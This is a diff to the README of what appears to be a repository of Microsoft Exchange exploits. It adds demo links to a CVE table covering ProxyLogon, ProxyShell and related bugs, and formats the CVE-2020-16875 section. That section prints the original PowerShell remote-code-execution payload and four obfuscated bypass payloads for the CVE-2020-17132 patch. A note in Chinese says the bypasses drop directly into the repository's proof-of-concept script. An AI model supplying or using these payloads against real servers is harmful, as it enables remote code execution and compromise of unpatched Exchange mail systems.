@@ -19,15 +19,15 @@ ProxyLogon is Just the Tip of the Iceberg: A New Attack Surface on Microsoft Exc
 | CVE-2019-1166 (暂无域环境) | [CVE-2019-1166](https://msrc.microsoft.com/update-guide/en-US/advisory/CVE-2019-1166) | Oct 8, 2019 | Windows NTLM Tampering Vulnerability | yes |
 | CVE-2019-1373 () | [CVE-2019-1373](https://msrc.microsoft.com/update-guide/en-US/advisory/CVE-2019-1373) | Nov 12, 2019 | Microsoft Exchange Remote Code Execution Vulnerability | yes |
 | CVE-2020-0688 (completed) | [CVE-2020-0688](https://msrc.microsoft.com/update-guide/en-US/advisory/CVE-2020-0688) | Feb 11, 2020 | Microsoft Exchange Validation Key Remote Code Execution Vulnerability | yes |
-| CVE-2020-16875 (completed) | [CVE-2020-16875](https://msrc.microsoft.com/update-guide/en-US/advisory/CVE-2020-16875) | Sep 8, 2020 | Microsoft Exchange Server DlpUtils AddTenantDlpPolicy Remote Code Execution | yes |
-| CVE-2020-17132 (completed) | [CVE-2020-17132](https://msrc.microsoft.com/update-guide/en-US/advisory/CVE-2020-17132) | Dec 8, 2020 | Microsoft Exchange Server DlpUtils AddTenantDlpPolicy Remote Code Execution CVE-2020-16875 bypass | yes |
+| CVE-2020-16875 (completed) [youtube demo]() | [CVE-2020-16875](https://msrc.microsoft.com/update-guide/en-US/advisory/CVE-2020-16875) | Sep 8, 2020 | Microsoft Exchange Server DlpUtils AddTenantDlpPolicy Remote Code Execution | yes |
+| CVE-2020-17132 (completed) [youtube demo]() | [CVE-2020-17132](https://msrc.microsoft.com/update-guide/en-US/advisory/CVE-2020-17132) | Dec 8, 2020 | Microsoft Exchange Server DlpUtils AddTenantDlpPolicy Remote Code Execution CVE-2020-16875 bypass | yes |
 | CVE-2020-17083 | [CVE-2020-17083]() |  |  | yes |
 | CVE-2020-17143 | [CVE-2020-17143]() |  |  | yes |
 | CVE-2020-17144 | [CVE-2020-17144]() |  |  | yes |
 | CVE-2021-24085 | [CVE-2021-24085](https://msrc.microsoft.com/update-guide/en-US/advisory/CVE-2021-24085) | Feb 9, 2021 | An authenticated attacker can leak a cert file which results in a CSRF token to be generated. | yes |
 | CVE-2021-28482 | [CVE-2021-28482]() |  |  | yes |
-| ProxyLogon (completed) | [CVE-2021-26855](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-26855) | Mar 02, 2021 | server-side request forgery (SSRF) | yes |
-| ProxyLogon (completed) | [CVE-2021-27065](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-27065) | Mar 02, 2021 | Microsoft.Exchange.Management.DDIService.WriteFileActivity未校验写文件后缀，可由文件内容部分可控的相关功能写入WebShell | yes |
+| ProxyLogon (completed) [youtube demo](https://www.youtube.com/watch?v=KoGodxigujA) | [CVE-2021-26855](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-26855) | Mar 02, 2021 | server-side request forgery (SSRF) | yes |
+| ProxyLogon (completed) [youtube demo](https://www.youtube.com/watch?v=KoGodxigujA) | [CVE-2021-27065](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-27065) | Mar 02, 2021 | Microsoft.Exchange.Management.DDIService.WriteFileActivity未校验写文件后缀，可由文件内容部分可控的相关功能写入WebShell | yes |
 | ProxyOracle (completed) | [CVE-2021-31196](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-31196) | Jul 13, 2021 | Reflected Cross-Site Scripting | yes |
 | ProxyOracle (completed) | [CVE-2021-31195](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-31195) | May 11, 2021 | Padding Oracle Attack on Exchange Cookies Parsing | yes |
 | ProxyShell (completed) | [CVE-2021-34473](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-34473) | Apr 13, 2021 | Pre-auth Path Confusion leads to ACL Bypass | yes |
@@ -413,28 +413,41 @@ meterpreter >
  - [Microsoft Exchange Remote Code Execution - CVE-2020-16875](https://www.x41-dsec.de/security/advisory/exploit/research/2020/12/21/x41-microsoft-exchange-rce-dlp-bypass/)
 
 
+ - origin payload:
+
+``` bash
 $i=New-object System.Diagnostics.ProcessStartInfo;$i.UseShellExecute=$true;$i.FileName="cmd";$i.Arguments="/c %s";$r=New-Object System.Diagnostics.Process;$r.StartInfo=$i;$r.Start()
+```
 
-bypass1:
+以下bypass payload直接替换[cve-2020-16875](./CVE-2020-16875/cve-2020-16875.py)poc脚本中的原poc代码即可，补丁绕过原理及手法分析以上文章链接写的很清楚
+
+ - ![](./pics/CVE-2020-17132.png)
+
+ - bypass1:
+
+``` bash
 neW-tRaNsPoRtRuLe $([Diagnostics.Process]::Start("cmd", "/c %s")) #-dLpPoLiCy
+
 neW-tRaNsPoRtRuLe fdvoid0; [Diagnostics.Process]::Start("cmd", "/c %s") #-dLpPoLiCy
+```
 
-bypass2:
+ - bypass2:
+
+``` bash
 neW-tRaNsPoRtRuLe fdvoid0; $poc='New-object'; $i = & $poc System.Diagnostics.ProcessStartInfo; $i.UseShellExecute = $true; $i.FileName="cmd"; $i.Arguments="/c %s"; $r = & $poc System.Diagnostics.Process; $r.StartInfo = $i; $r.Start() #-dLpPoLiCy
+```
 
-bypass3:
+ - bypass3:
+
+``` bash
 neW-tRaNsPoRtRuLe $([Diagnostics.Process]::Start("cmd", "/c %s")) -DlpPolicy "%%DlpPolicyName%%"
+```
 
-bypass4:
+ - bypass4:
+
+``` bash
 & 'Invoke-Expression' '[Diagnostics.Process]::Start("cmd","/c %s")'; New-TransportRule -DlpPolicy
-
-
-
-
-
-
-
-
+```
 
 # CVE-2020-17083
 ## CVE-2020-17083 part links
